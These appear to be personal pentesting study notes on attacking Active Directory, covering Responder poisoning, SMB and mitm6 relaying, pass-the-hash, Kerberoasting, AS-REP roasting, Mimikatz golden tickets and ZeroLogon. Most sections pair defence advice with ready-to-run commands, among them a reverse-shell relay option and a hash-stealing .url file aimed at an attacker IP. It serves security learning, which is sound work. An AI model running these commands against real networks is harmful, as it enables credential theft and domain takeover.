---
title: Attacking Active Directory
date: 2022-01-08
categories: [Notes, Pentesting Notes]
tags: ActiveDirectory CVE-2021-1675 CVE-2020-1472 ZeroLogon PrintNightmare MS14-025 Ticket Attacks Kerberoasting Bloodhound PowerView MITM6 
image:
  src: /assets/Images-Notes-01/PEH.png
  width: 560px   # in pixels
  height: 387px   # in pixels
  alt: ActiveDirectory
---

# Attacking Active Directory: Initial Attack Vectors

I am writing this for final preparation of OCSP.
This article (notes) is gathered from PEH course by TCM academy and some blogs from internet. 

Links are at bottom of page. 

Do use `Contents` button on right side to easily navigate through topics.

---
## Netbios and LLMNR Name Poisoning

### Explanation
- LLMNR : Link Local Multicast Name Resolution. Basically DNS. It is used to identify hosts when DNS fails to do so.
- Previously NBT-NS.
- Key flaw is that  the services utilize a user's username and NTLMv2 hash when appropriately responded to.


![](/assets/Images-Notes-01/2022-01-06-21-50-11.png)

### Attack
**Attack Condition** : MITM and internal network.

**Attack Method**
1. Run `responder`
2. Trigger / Wait for an event.
3. Capture Hashes.


```bash
responder.py -I tun0 -rdw
```
![](/assets/Images-Notes-01/2022-01-06-21-54-59.png)
![](/assets/Images-Notes-01/2022-01-06-21-55-17.png)
![](/assets/Images-Notes-01/2022-01-06-21-55-46.png)

Then crack these hashes with `hashcat`. 

### Defence
> The best defense in this case is to disable LLMNR and NBT-NS
> - To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.
> - To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP".
> If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to : 
> - Require Network Access Control (with MAC Filters)
> - Require strong user passwords.

---
## SMB Relay Attacks

Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.

**Attack Condition** : 
- SMB Signing must be in _not required/disabled_ state on target. (from `nmap` we can get this) `No packet/sign validation.`
- Relayed user credentials must be admin on machine.

**Tools** : `Responder` and 
- disable `SMB` and `HTTP` from `responder.conf` file. So we can still listen but not respond through responder tool.

**Attack Method**
1. Run `responder` and then 
2. Run `ntlmrelayx`
3. Trigger / Wait for an event.
4. SAM hashes are captured and relayed.

> Windows SAM file = Linux Shadow File.

```bash
responder.py -I tun0 -rdw
ntlmrelayx.py -tf targets.txt -smb2support
```

![](/assets/Images-Notes-01/2022-01-06-22-24-31.png)
![](/assets/Images-Notes-01/2022-01-06-22-25-24.png)
![](/assets/Images-Notes-01/2022-01-06-21-55-17.png)
![](/assets/Images-Notes-01/2022-01-06-22-29-31.png)

Immediately the hashes are relayed to a bunch of machines which was mentioned in _targets.txt_ with `ntlmrelayx` command.

**Attack Shell**
![](/assets/Images-Notes-01/2022-01-07-00-08-30.png)
_ntlmrelayx.py interactive_

![](/assets/Images-Notes-01/2022-01-07-00-10-45.png)
_smb shell_

Other ways to abuse this feature are below.
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
ntlmrelayx.py -tf targets.txt -smb2support -e evil.exe # execute rev shell
ntlmrelayx.py -tf targets.txt -smb2support -c whoami # execute command
```

`msfconsole`'s psexec module / `psexec.py` will give complete cmd shell.

Sometimes it will require multiple attempts. Shares should be writeable.

Also try `smbexec.py` and `wmiexec.py`.

### Defence
> - Enable SMB Signing on all devices
>   - Pro : Completely stops the attack
>   - Con : Can cause performance issues with file copies.
> - Disable NTLM authentication on network.
>   - Pro : Completely stops the attack
>   - Con : If Kerberos stops working, Windows defaults back to NTLM.
> - Account tiering
>   - Pro : Limits domain admins to specific tasks.
>   - Con : Enforcing the policy may be difficult.
> - Local admin restriction
>   - Pro : Can prevent a lot of lateral movement.
>   - Con : Potential increase in the amount of service desk tickets.

---
## MITM 6 / IPv6 Attack / DNS Takeover Attack
[MITM6 CheatSheet Read](https://cheatsheet.haax.fr/windows-systems/exploitation/ipv6/)
### Explanation
`mitm6` is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. 
> It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. 
> 
> The DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. 

### Attack
**Attack Condition** : 
- IPv4 is mostly used in systems. IPv6 may be turned on and may not being used.
- Nothing/Nobody is doing DNS for IPv6.

**Now, this will be leveraged.** 
Attacker machine will `spoof as DNS`. All IPv6 traffic will be sent through this, causing victims to connect to ntlmrelayx for HTTP and SMB connections.

We can get authentication to DC via LDAP or SMB.

> try chaining `smbrelay` + `mitm6` or it's default counterpart `ntlmreayx`.

**Tools** : [mitm6](https://github.com/dirkjanm/mitm6) 
    - in python2 venv. pip3 breaks the installation.

**Attack Method**
1. Run `mitm6` and then 
2. Run `ntlmrelayx`
3. Reboot a machine in network.
4. Now a lot of info will be dumped into a file by ntlmrelayx.
5. When any administrator login into any machine in network the credentials will be relayed. A new user account will be created with admin privileges. 

Now it can be used to access DC.
```bash
mitm6 -d marvel.local

ntlmrelayx -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
```

![](/assets/Images-Notes-01/2022-01-07-12-36-47.png)
![](/assets/Images-Notes-01/2022-01-07-12-44-04.png)

`mitm6` will start sending replies to all the DNS queries.
After rebooting any one machine in network mitm6 will:
- start enumerating the relayed credentials.
- Checking the privileges.
- Domain info will be dumped into a file. (-l lootme)

![](/assets/Images-Notes-01/2022-01-07-12-50-38.png)
![](/assets/Images-Notes-01/2022-01-07-12-51-27.png)

When an Administrator put password at login screen then
- attack will target ldap.
- set up an access control list.
- Create a new user.
- It can also add a computer in network. Check resource.
  
![](/assets/Images-Notes-01/2022-01-07-12-54-00.png)
![](/assets/Images-Notes-01/2022-01-07-13-00-13.png)

### Defence
- IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environment. If you don't use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of allow prevents the attack from working  
  - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-In)
  - (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
  - Outbound Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-Out)
> - If WPAD is not in use internally, disable it via Group Policy and by Disabling the WinHttpAutoProxySvc service.
> - Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
> - Consider Administrative users to the Protected Users Group or marking them as Account is sensitive and cannot be delegated which will prevent any impersonation of that user via delegation.

---

## Passback Attack

SMB + `Printer` + **`Default Credentials`** + LDAP + ncat + Responder
This case is rare. 

Read below blog for this.

[A Pen Tester’s Guide to Printer Hacking](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)

Printer has potential to get DC. Don't underestimate this.

---

## Other Vectors & Strategies
- Begin day with mitm6 or responder.
- run scans to generate traffic.
- if scans are taking too long, look for websites in scope (`http_version`).
- Look for default credentials on web logins
  - Printers
  - Jenkins
  - etc.
- Think outside the box. Like chain attack vectors.
- Enumerate and abuse features.

---
# Attacking Active Directory: Post-Compromise Enumeration

*These tools will be used after compromising any machine in network with aim to get DC.*

## PowerView
**`PowerView`** : PS tool to enumerate Domain Controller, Policy, Users, Groups etc.

[PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView) and 
do check [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

**Enumeration Methods**
```powershell
# Load PowerView
powershell -ep bypass
. .\PowerView.ps1

# Get Domain info
Get-NetDomain

# Get All DC Info | Most useful.
Get-NetDomainController

# Get Domain Policy
Get-DomainPolicy
(Get-DomainPolicy)."system access"

Get-NetUser # All user's detailed info
Invoke-ShareFinder # Find Interesting Shares
```
[PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

---
## Bloodhound
**`Bloodhound`** : tool to visualize in a graph form what is going on domain in the network and where we can find the sensitive user and shortest path to get to domain admin.

> Sharphound : bloodhound Created in C#

Get [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1) to `Invoke-BloodHound` function.

And transfer it to compromised machine.

```powershell
# Load SharpHound
powershell -ep bypass
. .\SharpHound.ps1

# running the ingestor
Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
```

It will collect all data to `file.zip`. Transfer it back to attacker machine for analysis in bloodhound.

In attacker machine start `neo4j` and then `bloodhound`.
And upload data. No need to unzip files.

---
# Attacking Active Directory: Post-Compromise Attacks

*This requires some sort of credentials first cracked or hashed.*

## Pass the Hash / Password
If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks.

*updated `crackmapexec` has slightly different syntax. It may not match with below given screenshots as this was recorded before update of cme.*

### Attack Methods
```bash
crackmapexec smb 10.10.10.99 -u sUser -d DOMAIN -p Password1
crackmapexec smb 10.10.10.99 -u sUser -H sOmEntlmHash --local-auth
# trying to dump SAM file
crackmapexec smb 10.10.10.99 -u sUser -d DOMAIN -p Password1
```

For Example : 
_Credentials here will be passed to entire subnet._
![](/assets/Images-Notes-01/2022-01-08-00-49-58.png)
_crackmapexec | passthepassword attack_

![](/assets/Images-Notes-01/2022-01-08-00-47-43.png)
_crackmapexec | passthehash attack_

*we can also use impacket tools like `psexec.py` for password / hash attacks.*

---

### Dumping Hashes with secretsdump.py

If we have atleast 1 set of credentials we can try to grab password hashes saved in cache.

```bash
secretsdump.py marvel/fcastle:Password1@10.10.10.99
```
![](/assets/Images-Notes-01/2022-01-08-01-02-32.png)
![](/assets/Images-Notes-01/2022-01-08-01-01-35.png)

### Defence
Hard to completely prevent, but we can make it more difficult on an attacker:
> - Limit account re-use:
>   - avoid re-using local admin password.
>   - Disable Guest and Administrator accounts.
>   - Limit who is a local administrator (least privilege)
> - Utilizing strong passwords
>   - The longer the better (>14 characters)
>   - avoid using common words.
>   - I like long sentences
> - Privilege Access Management
>   - Check out/in sensitive accounts when needed.
>   - Automatically rotate passwords on check out and check in.
>   - Limits pass attacks as hash/password is strong and constantly rotated.

---
## Token Impersonation
### Explanation
Tokens : Temporary keys that allow you access to a system/network without having to provide credentials each time you access af file. 
Think cookies for computers.
> Types : 
>   - Delegate - Created for loggin into a machine or using Remote Desktop
>   - Impersonate - "non interactive" such as attacking a network drive or a domain logon script.

### Attack
**Attack Condition** : MITM and internal network.
**Tools** : **`Responder`** from `Impacket`.

**Attack Method**
1. Pop a shell and load Incognito.
2. Impersonate our domain user.

**Note** : We will be only able to impersonate any user only if they are logged in once.
```bash
meterpreter> load  incognito
meterpreter> list_tokens -u
  ...a list of users...
meterpreter> impersonated user MARVEL\fcastle
```
![](/assets/Images-Notes-01/2022-01-08-13-27-13.png)
![](/assets/Images-Notes-01/2022-01-08-13-28-04.png)

Attempt to dump hashes as non-Domain Admin
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer HYDRA.marvel.local
```
### Defence
> - Limit  user/group token creation permissions.
> - Account tiering.
> - local admin restriction.

---
## Kerberoasting

Shout-out to **Mohit Panwar**. Below notes are taken from his [blog](https://medium.com/@Shorty420/kerberoasting-9108477279cc).

### Explanation
1. When a user logs on to Active Directory, the user authenticates to the Domain Controller (DC) using the user’s password which of course the DC knows.
2. The DC sends the user a `Ticket Granting Ticket (TGT)` Kerberos ticket. The TGT is presented to any DC to *prove authentication* for Kerberos service tickets.
3. The user opens up Skype which causes the user’s workstation to lookup the `Service Principal Name (SPN)` for the user’s Exchange server.
4. Once the SPN is identified, the computer communicates with a DC again and presents the user’s TGT as well as the SPN for the resource to which the user needs to communicate.
5. The DC replies with the `Ticket Granting Service (TGS)` Kerberos service ticket.
6. The user’s workstation presents the TGS to the Exchange server for access.
7. Skype connects successfully.

![](/assets/Images-Notes-01/2022-01-08-13-54-21.png)
_Kerberoasting in action_

**Attack Method**

Once you have admin/standard user access, look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket.
```bash
GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
```
![](/assets/Images-Notes-01/2022-01-08-13-55-16.png)
_TGS ticket dump from Attacker’s PC_

Now once you have the `TGS hash`, all we need to do is to feed the hash to Hashcat tool to fetch Server’s user.
```
Hashcat -m 13100 <hash_file> <rockyou wordlist>
```
![](/assets/Images-Notes-01/2022-01-08-13-56-00.png)

**Important note:** _If any of the above test gives a negative result, keep an eye on your Wireshark traffic. Mostly setting up static DHCP or DNS or Gateway IP address solves such issues. This is a very small thing to underestimate which will affect the pentest in a peculiar way._

### Defence
> - If possible use group managed service accounts which have random, complex passwords (>100 characters) and are managed automatically by Active Directory
> - Ensure all service accounts (user accounts with Service Principal Names) have long, complex passwords greater than 25 characters, preferably 30 or more. This makes cracking these password far more difficult.
> - Service Accounts with elevated AD permissions should be the focus on ensuring they have long, complex passwords.
> - Ensure all Service Account passwords are changed regularly

---
## AS-REP Roasting
There is an option for an account to have the property "Do not require Kerberos pre-authentication" or `UF_DONT_REQUIRE_PREAUTH` set to true. AS-REP Roasting is an attack against Kerberos for these accounts.

During pre-authentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request. 

From there, the TGT will be issued for the user to use for future authentication.  *If pre-authentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.*

Luckily, pre-authentication is required by default in Active Directory. 

Read More [here](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/).

In my HackTheBox experience I have got `Kerberos ticket without a valid credentials.` We can use the script to output both the vulnerable usernames and their corresponding encrypted TGTs. [Ref](https://ranakhalil101.medium.com/hack-the-box-forest-writeup-w-o-metasploit-63070c9020e4)

```bash
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
```
![](/assets/Images-Notes-01/2022-01-08-14-02-04.png)

The `Kerberos pre-authentication` option has been disabled for the above user svc-alfresco and the KDC gave us back a TGT encrypted with the user’s password.

---
## GPP / cPassword Attacks / MS14-025
### Explanation
Group Policy Preferences allowed admins to create policies using embedded credentials.
These credentials were encrypted and they were placed in XML document and they were stored in variable `"cPassword"`.
- They key was accidentally released.
- Patched in MS14-025, but doesn't prevent previous uses.
- Look for `Groups.xml` or any interesting in XML file. Most of the time these credentials are domain admin credentials and will allow us access to domain admin accounts.

More info on this is here [Group Policy Pwnage](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

*Refer to `Active` machine walk-through in HackTheBox.*

**Tools** : `gpp-decrypt`

---
## url File Attack
After compromising a user if User have access to any writeable file share. 
This can be utilized to capture more hashes via responder and possibly get credentials of any user with higher/different privileges.

> SCF Attack and url File attack uses same idea.

**Attack Method**
1. Run Responder on attacker machine. Then on target
2. Create one shortcut file with below text block.
3. While saving it save it as "All files".
4. Put it in File Share with catchy name.
5. Wait for any other domain users to access that folder / file created. 

It will capture hashes. 

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```
- where x.x.x.x = AttackerIP
This block of code is of Internet shortcut.

Refer `SCF and URL file attack against writeable share` section on [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share).

---
## PrintNightmare (CVE-2021-1675)

`CVE-2021-1675` is a critical remote code execution and local privilege escalation vulnerability dubbed "PrintNightmare."
> - This remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. 
> - An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.


***Requires latest version of Impacket.***
### Attack Methods

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable.

And follow instructions from these two repos:
- [cube0x0 RCE](https://github.com/cube0x0/CVE-2021-1675)
- [calebstewart LPE](https://github.com/calebstewart/CVE-2021-1675)

---
## Mimikatz

It's now well known to extract plaintext passwords, hash, PIN code and kerberos tickets from memory. 

`mimikatz` can also perform pass-the-hash, pass-the-ticket or build Golden tickets.

[Mimikatz](https://github.com/gentilkiwi/mimikatz)

[Mimikatz Binaries](https://github.com/gentilkiwi/mimikatz/releases)

*Do check `mimikatz wiki` for info on other modules.*

---
## Golden Ticket Attacks / Pass the Ticket

A Golden Ticket attack is when an attacker has complete and unrestricted access to an entire domain — all computers, files, folders, and most importantly, the access control system itself.

> Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service. The attacker gains control over the domain’s Key Distribution Service account (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).


**Attack Method**
1. capture `sid of domain` and `NTLM Hash of Kerberos TGT account`
```
cmd> mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```
1. Now create Golden ticket.
```
mimikatz # kerberos::golden /User:real_or_fake_user /domain:marvel.local /sid:sid_of_domain /krbtgt:NTLM_Hash /id:500 /ptt
```
> Note : `RID 500 = Administrator` and `ptt = pass the ticket`
1. And finally pop a shell.
```
mimikatz # misc::cmd
```

![](/assets/Images-Notes-01/2022-01-08-22-48-42.png)
_For sid and NTLM hash_

![](/assets/Images-Notes-01/2022-01-08-22-49-04.png)
_golden ticket_

![](/assets/Images-Notes-01/2022-01-08-22-49-11.png)
_poping shell after golden ticket_

- After this point we can use `psexec.exe` and gain access to this machine.
- Golden ticket can also help us to create persistent.

---
## ZeroLogon

### Explanation
- Zerologon is a vulnerability in the cryptography of Microsoft’s Netlogon process/Netlogon Remote Protocol (MS-NRPC) that allows an attack against Microsoft Active Directory domain controllers.
- Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller.
It allows users to log on to servers that are using NT LAN Manager (NTLM). 

This is complex attack. It will set Domain Controller authentication to null. **After running this attack if we do not restore the password we will break DC.**

> Use this repo for attack : [dirkjanm CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

*Note : Requires the latest impacket from [GitHub](https://github.com/SecureAuthCorp/impacket) with added netlogon structures. And Only works on Python 3.6 and newer!*

Good reads are below
- [What is ZeroLogon?](https://www.trendmicro.com/en_us/what-is/zerologon.html)
- [dirkjanm CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
- [SecuraBV ZeroLogon Checker](https://github.com/SecuraBV/CVE-2020-1472)

---

# RelatedBlogs

Do checkout these awesome blogs/articles. 
These were referred many times in PEH course. These can be really useful.

[Top Five Ways I Got Domain Admin](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

[More on mitm6](https://www.fox-it.com/nl-en/blog-6-mitm6-compromising-ipv4-networks-via-ipv6/)

[Combining NTLM Relays and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

[A Pen Tester’s Guide to Printer Hacking](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)

---